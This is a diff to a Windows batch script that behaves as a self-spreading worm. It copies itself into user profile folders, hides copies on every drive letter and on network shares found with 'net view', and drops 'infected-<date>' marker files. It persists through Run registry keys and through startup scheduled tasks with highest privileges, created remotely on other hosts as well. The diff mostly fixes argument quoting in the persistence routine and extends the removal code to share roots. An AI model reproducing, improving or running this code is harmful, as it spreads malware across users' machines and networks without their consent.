@@ -105,7 +105,7 @@ for %%i in (path_autoRun1 path_autoRun2) do if not exist "!%%i!\%~nx0" (
 for %%i in (localAppData appData) do (
   if not exist "!%%i!\%~nx0" call copy /y "%~f0" "!%%i!\"
   call %module_fileTouch% "!%%i!\%~nx0" >nul
-  %autoRun% add %%i "!%%i!\%~nx0"
+  %autoRun% add "%%i" "!%%i!\%~nx0"
 )
 
 
@@ -209,7 +209,7 @@ for %%i in (path_autoRun1 path_autoRun2) do if exist "!%%i!\%~nx0" call del /q "
 
 for %%i in (localAppData appData) do (
   if exist "!%%i!\%~nx0" call del /q "!%%i!\%~nx0"
-  %autoRun% delete %%i
+  %autoRun% delete "%%i"
 )
 
 
@@ -220,9 +220,9 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%
   if exist "%%i:\%~nx0" (
     attrib -h -s "%%i:\%~nx0"
     del /q "%%i:\%~nx0"
-    %autoRun% delete %%i
+    %autoRun% delete "%%i:"
   )
-  
+
   if exist "%%i:\infected-%app_date%" (
     attrib -h -s "%%i:\infected-%app_date%"
     del /q "%%i:\infected-%app_date%"
@@ -232,7 +232,7 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%
     if /i "%%j" == "System Volume Information" if exist "%%i:\%%j\%~nx0" (
       attrib -h -s "%%i:\%%j\%~nx0"
       del /q "%%i:\%%j\%~nx0"
-      %autoRun% delete %%i
+      %autoRun% delete "%%i:\SVI"
     )
 
     if exist "%%i:\System Volume Information\infected-%app_date%" (
@@ -253,11 +253,22 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%
 
 for /f "skip=3 tokens=1,* delims= " %%h in ('net view 2^>nul') do if /i "%%h" NEQ "The" (
   for /f "skip=7 tokens=1,* delims= " %%i in ('net view %%h 2^>nul') do if /i "%%i" NEQ "The" (
+    if exist "%%h\%%i\%~nx0" (
+      attrib -h -s "%%h\%%i\%~nx0"
+      del /q "%%h\%%i\%~nx0"
+      %autoRun% delete "%%h\%%i"
+    )
+
+    if exist "%%h\%%i\infected-%app_date%" (
+      attrib -h -s "%%h\%%i\infected-%app_date%"
+      del /q "%%h\%%i\infected-%app_date%"
+    )
+
     for /f "delims=" %%j in ('dir "%%h\%%i\*" /a:d /b 2^>nul') do (
       if /i "%%j" == "System Volume Information" if exist "%%h\%%i\%%j\%~nx0" (
         attrib -h -s "%%h\%%i\%%j\%~nx0"
         del /q "%%h\%%i\%%j\%~nx0"
-        %autoRun% delete %%i %%h
+        %autoRun% delete "%%h\%%i\SVI"
       )
 
       if exist "%%h\%%i\%%j\infected-%app_date%" (
@@ -295,29 +306,33 @@ exit
 
 
 :autoRun
+set option2=%2
+if "!option2!" NEQ "" set option2=!option2:"=!
+
 set option3=%3
-if "!option3!" NEQ "" set "option3=!option3:"=!"
+if "!option3!" NEQ "" set option3=!option3:"=!
 
 set option4=%4
-if "!option4!" NEQ "" set "option4=!option4:"=!"
+if "!option4!" NEQ "" set option4=!option4:"=!
 
 
 
 (
   if "%1" == "add" (
-    reg add %option4%HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %2" /d "%option3%" /f
-    reg add %option4%HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %2" /d "%option3%" /f
-    reg add %option4%HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %2" /d "%option3%" /f
+    reg add %option4%HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %option2%" /d "%option3%" /f
+    reg add %option4%HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %option2%" /d "%option3%" /f
+    reg add %option4%HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %option2%" /d "%option3%" /f
 
-    if "%option4%" == " " ( schtasks /create /sc onstart /tn "%app_name% %2" /tr "%option3%" /f /rl highest
-    ) else for /f "delims=\" %%z in ("%option4%") do schtasks /create /s %%z /sc onstart /tn "%app_name% %2" /tr "%option3%" /f /rl highest
+    if "%option4%" == " " ( schtasks /create /sc onstart /tn "%app_name% %option2%" /tr "%option3%" /f /rl highest
+    ) else for /f "delims=\" %%z in ("%option4%") do schtasks /create /s %%z /sc onstart /tn "%app_name% %option2%" /tr "%option3%" /f /rl highest
   ) else (
-    reg delete %option3%HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %2" /f
-    reg delete %option3%HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %2" /f
-    reg delete %option3%HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %2" /f
 
-    if "%option3%" == " " ( schtasks /delete /tn "%app_name% %2" /f
-    ) else for /f "delims=\" %%z in ("%option3%") do schtasks /delete /s %%z /tn "%app_name% %2" /f
+    reg delete %option3%HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %option2%" /f
+    reg delete %option3%HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %option2%" /f
+    reg delete %option3%HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %option2%" /f
+
+    if "%option3%" == " " ( schtasks /delete /tn "%app_name% %option2%" /f
+    ) else for /f "delims=\" %%z in ("%option3%") do schtasks /delete /s %%z /tn "%app_name% %option2%" /f
   )
 )>nul 2>nul
 exit /b
@@ -342,7 +357,7 @@ if exist %*\"%app_file_name%" (
   attrib +h +s %*\"%app_file_name%"
   %module_fileTouch% %*\"%app_file_name%" >nul
 
-  %autoRun% add %* %*\"%app_file_name%"
+  %autoRun% add "%*" %*\"%app_file_name%"
 )
 
 if not exist %*\"System Volume Information" md %*\"System Volume Information"
@@ -354,7 +369,7 @@ if exist %*\"System Volume Information\%app_file_name%" (
   attrib +h +s %*\"System Volume Information\%app_file_name%"
   %module_fileTouch% %*\"System Volume Information\%app_file_name%" >nul
 
-  %autoRun% add %* %*\"System Volume Information\%app_file_name%"
+  %autoRun% add "%*\SVI" %*\"System Volume Information\%app_file_name%"
 )
 
 
